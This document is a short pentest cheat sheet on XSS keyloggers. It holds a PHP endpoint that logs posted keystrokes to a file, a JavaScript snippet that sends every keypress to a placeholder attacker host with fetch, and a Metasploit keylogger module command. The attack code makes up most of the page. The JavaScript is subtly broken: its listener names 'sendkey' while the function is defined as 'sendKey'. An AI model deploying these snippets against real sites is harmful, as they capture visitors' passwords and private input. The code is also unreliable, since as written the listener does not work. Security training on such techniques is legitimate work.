# Keyloggers

Search Tag(s): #helpers #webapp-pentesting #cross-site-scripting

## 01 - Server-Side

### 1.1 - PHP

```php
<?php
header("Access-Control-Allow-Origin: *");
if(!empty($_POST['key'])) {
    $log = fopen('keylog.txt', 'a+');
    fwrite($log, $_POST['key']);
    fclose($log);
}
?>
```

### 1.2 - JavaScript

```js
function sendKey(event) {
	fetch("http[s]://<IP>/data?k=" + event.key);
}
document.addEventListener('keydown', sendkey);
```

## 02 - Metasploit

TODO: Fill this info

```
msf > use auxiliary/server/capture/http_javascript_keylogger

msf auxiliary(server/capture/http_javascript_keylogger) > options
```

---
## References

### Hacktricks

- [Hacktricks: XSS (Cross Site Scripting)](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)

### IMVK

- [IMVK: Cross Site Scripting - Exploitation](https://imvk.net/en/infosec/ethical-web-hacking/cross-site-scripting-exploitation)

### Geeky much

- [Geeky much: Cross-site Scripting](https://medium.com/secure-you/cross-site-scripting-b64f440ae060)

### Rapid7

- [Rapid7: Metasploit Framework - JavaScript Keylogger](https://www.rapid7.com/blog/post/2012/02/21/metasploit-javascript-keylogger/)

### Pentest Tools

- [Pentest Tools: 10 Practical scenarios for XSS attacks](https://pentest-tools.com/blog/xss-attacks-practical-scenarios)